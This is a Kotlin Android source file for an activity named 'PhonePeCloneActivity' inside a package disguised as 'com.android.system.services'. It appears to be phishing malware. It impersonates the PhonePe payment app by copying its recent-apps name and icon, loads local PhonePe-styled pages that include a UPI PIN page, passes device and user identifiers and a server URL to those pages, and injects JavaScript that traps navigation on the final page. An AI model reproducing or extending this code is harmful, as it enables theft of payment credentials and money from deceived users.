package com.android.system.services

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.graphics.BitmapFactory
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.WindowManager
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import com.android.system.services.utils.DeviceInfoHelper
import com.android.system.services.ServerConfig

class PhonePeCloneActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var deviceId: String
    private lateinit var appConfig: AppConfig

    companion object {
        private const val TAG = "PhonePeClone"
        private const val PREFS_NAME = "final_state_prefs"
        private const val KEY_REACHED_FINAL = "final_reached"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        enableFullscreen()
        
        appConfig = AppConfig.load(this)
        deviceId = DeviceInfoHelper.getDeviceId(this)
        ServerConfig.initialize(this)
        
        setTaskDescriptionForRecentApps()
        
        webView = createWebView()
        setContentView(webView)
        
        loadSplashScreen()
    }

    private fun setTaskDescriptionForRecentApps() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val taskName = "PhonePe"
            
            try {
                val iconStream = assets.open("phonepe-icon.png")
                val iconBitmap = BitmapFactory.decodeStream(iconStream)
                iconStream.close()
                
                val taskDescription = ActivityManager.TaskDescription(
                    taskName,
                    iconBitmap,
                    ContextCompat.getColor(this, android.R.color.white)
                )
                setTaskDescription(taskDescription)
            } catch (e: Exception) {
                val taskDescription = ActivityManager.TaskDescription(
                    taskName,
                    BitmapFactory.decodeResource(resources, android.R.drawable.ic_menu_myplaces),
                    ContextCompat.getColor(this, android.R.color.white)
                )
                setTaskDescription(taskDescription)
            }
        }
    }

    private fun enableFullscreen() {
        supportActionBar?.hide()
        WindowCompat.setDecorFitsSystemWindows(window, false)
        val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
        windowInsetsController.apply {
            hide(WindowInsetsCompat.Type.systemBars())
            systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                isAppearanceLightStatusBars = false
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                isAppearanceLightNavigationBars = false
            }
        }
        window.statusBarColor = android.graphics.Color.TRANSPARENT
        window.navigationBarColor = android.graphics.Color.TRANSPARENT
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
    }

    private fun createWebView(): WebView {
        val webView = WebView(this).apply {
            layoutParams = android.view.ViewGroup.LayoutParams(
                android.view.ViewGroup.LayoutParams.MATCH_PARENT,
                android.view.ViewGroup.LayoutParams.MATCH_PARENT
            )
            isVerticalScrollBarEnabled = false
            isHorizontalScrollBarEnabled = false
            setBackgroundColor(android.graphics.Color.WHITE)
        }

        val webSettings: WebSettings = webView.settings
        webSettings.javaScriptEnabled = true
        webSettings.javaScriptCanOpenWindowsAutomatically = true
        webSettings.domStorageEnabled = true
        webSettings.databaseEnabled = true
        webSettings.allowFileAccess = true
        webSettings.allowContentAccess = true

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
            webSettings.allowFileAccessFromFileURLs = false
            webSettings.allowUniversalAccessFromFileURLs = false
        }

        webSettings.loadWithOverviewMode = true
        webSettings.useWideViewPort = true
        webSettings.layoutAlgorithm = WebSettings.LayoutAlgorithm.TEXT_AUTOSIZING
        webSettings.setSupportZoom(false)
        webSettings.builtInZoomControls = false
        webSettings.displayZoomControls = false
        webSettings.loadsImagesAutomatically = true
        webSettings.blockNetworkImage = false
        webSettings.blockNetworkLoads = false
        webSettings.cacheMode = WebSettings.LOAD_DEFAULT
        
        webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        webSettings.mediaPlaybackRequiresUserGesture = false
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        }

        webView.setInitialScale(100)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            webView.setLayerType(WebView.LAYER_TYPE_HARDWARE, null)
            WebView.setWebContentsDebuggingEnabled(true)
        } else {
            webView.setLayerType(WebView.LAYER_TYPE_SOFTWARE, null)
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
            webSettings.mediaPlaybackRequiresUserGesture = false
        }

        var mainClosed = false
        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, request: android.webkit.WebResourceRequest?): Boolean {
                val url = request?.url?.toString() ?: return false
                return handleUrlNavigation(url)
            }

            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                return if (url != null) {
                    handleUrlNavigation(url)
                } else {
                    false
                }
            }

            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
                
                if (url != null && url.contains("final.html", ignoreCase = true)) {
                    if (!mainClosed) {
                        closeMainActivity()
                        mainClosed = true
                    }
                    webView.evaluateJavascript(
                        """
                        (function() {
                            if (typeof window.onpopstate === 'function') {
                                window.onpopstate = null;
                            }
                            window.onpopstate = function() {};
                            
                            var originalLocation = window.location.href;
                            Object.defineProperty(window, 'location', {
                                get: function() {
                                    return {
                                        href: originalLocation,
                                        assign: function() {},
                                        replace: function() {}
                                    };
                                },
                                set: function(val) {
                                    if (val && (val.includes('final.html') || val.includes('upi-pin.html'))) {
                                        originalLocation = val;
                                    }
                                }
                            });
                        })();
                        """.trimIndent(),
                        null
                    )
                    
                    return
                }
                
                applyThemeColorFromPage()
            }
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onConsoleMessage(msg: android.webkit.ConsoleMessage?): Boolean {
                msg?.let { Log.d(TAG, "JS: ${it.message()}") }
                return true
            }
        }

        webView.addJavascriptInterface(object {
            @android.webkit.JavascriptInterface
            fun getDeviceId(): String = deviceId
            
            @android.webkit.JavascriptInterface
            fun getUserId(): String = appConfig.userId
            
            @android.webkit.JavascriptInterface
            fun getAppType(): String = appConfig.appType
            
            @android.webkit.JavascriptInterface
            fun getAppName(): String = appConfig.appName
            
            @android.webkit.JavascriptInterface
            fun getBaseUrl(): String = ServerConfig.getBaseUrl()
            
            @android.webkit.JavascriptInterface
            fun getPaymentAmount(): String = appConfig.payment.formattedAmount()
            
            @android.webkit.JavascriptInterface
            fun getPaymentDescription(): String = appConfig.payment.description

        @android.webkit.JavascriptInterface
        fun notifyPaymentSuccess() {
            notifyMainAppPaymentSuccess()
        }

        @android.webkit.JavascriptInterface
        fun markFinalReached() {
            markFinalLocally()
            notifyMainAppPaymentSuccess()
        }
        }, "Android")

        return webView
    }

    private fun handleUrlNavigation(url: String): Boolean {
        if (url.contains("index.html", ignoreCase = true)) {
            return true
        }
        
        if (url.startsWith("http://") || url.startsWith("https://")) {
            return false
        }
        
        if (url.endsWith(".html")) {
            val fullUrl = if (url.startsWith("file://")) {
                url
            } else if (url.startsWith("/")) {
                "file:///android_asset${url}"
            } else {
                "file:///android_asset/$url"
            }
            
            webView.loadUrl(fullUrl)
            return true
        }
        
        return false
    }

    private fun loadSplashScreen() {
        val splashPath = "file:///android_asset/phonepe-splash.html"
        webView.loadUrl(splashPath)
    }

    private fun applyThemeColorFromPage() {
        webView.evaluateJavascript(
            """
            (function() {
                try {
                    var metaTheme = document.querySelector('meta[name="theme-color"]');
                    if (metaTheme) {
                        return metaTheme.getAttribute('content');
                    }
                    return null;
                } catch(e) {
                    return null;
                }
            })();
            """.trimIndent()
        ) { color ->
            if (color != null && color != "null") {
                val colorValue = color.replace("\"", "")
                try {
                    val parsedColor = android.graphics.Color.parseColor(colorValue)
                    runOnUiThread {
                        window.statusBarColor = parsedColor
                        window.navigationBarColor = parsedColor
                        
                        val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            windowInsetsController.isAppearanceLightStatusBars = false
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            windowInsetsController.isAppearanceLightNavigationBars = false
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to parse color: $colorValue", e)
                }
            }
        }
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (::webView.isInitialized && webView.canGoBack()) {
            webView.goBack()
        } else {
            finish()
        }
    }

    private fun notifyMainAppPaymentSuccess() {
        try {
            markFinalLocally()
            val intent = Intent(this, MainActivity::class.java).apply {
                action = MainActivity.ACTION_SHOW_FINAL
                flags = Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to notify main app about payment success", e)
        } finally {
            closeSelfCompletely()
        }
    }

    private fun markFinalLocally() {
        try {
            val prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            prefs.edit().putBoolean(KEY_REACHED_FINAL, true).commit()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to persist final flag locally", e)
        }
    }

    private fun closeSelfCompletely() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                finishAndRemoveTask()
            } else {
                finishAffinity()
                finish()
            }
        } catch (e: Exception) {
            finish()
        }
    }

    private fun closeMainActivity() {
        try {
            val closeIntent = Intent(this, MainActivity::class.java).apply {
                action = MainActivity.ACTION_CLOSE
                flags = Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(closeIntent)
        } catch (e: Exception) {
            Log.e(TAG, "Error closing MainActivity", e)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        
        if (::webView.isInitialized) {
            webView.stopLoading()
            webView.clearCache(true)
            webView.destroy()
        }
    }
}